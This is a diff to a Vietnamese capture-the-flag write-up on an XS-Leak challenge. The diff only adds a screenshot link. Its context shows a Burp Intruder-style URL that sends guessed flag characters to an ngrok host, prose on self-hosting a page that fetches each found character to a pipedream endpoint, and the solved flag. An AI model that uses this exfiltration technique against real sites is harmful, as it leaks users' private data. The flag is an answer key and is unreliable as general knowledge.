@@ -89,6 +89,8 @@ url=https://451d-8-21-11-111.ap.ngrok.io/?flag=KCSC{W0W_H4§target§
 
 Flag chỉ có con bot nằm ở localhost mới thấy được. Bằng cách submit url trỏ đến trang `index.html` mình tự host, nếu onload không lỗi thì `fetch` đến pipe dream cùng kí tự vừa tìm thấy được, lặp đi lặp lại cho đến khi tìm được flag.
 
+![Screenshot (915)](https://user-images.githubusercontent.com/71699412/173527159-7bce2744-bb9e-4e62-b33b-8f94eeba9b6f.png)
+
 Có cách automate bằng python nhanh hơn nhưng công code thì mệt hơn
 
 **flag**: `KCSC{W0W_H4v3_U_h3ard_4b0ut_XS_L34k?}`
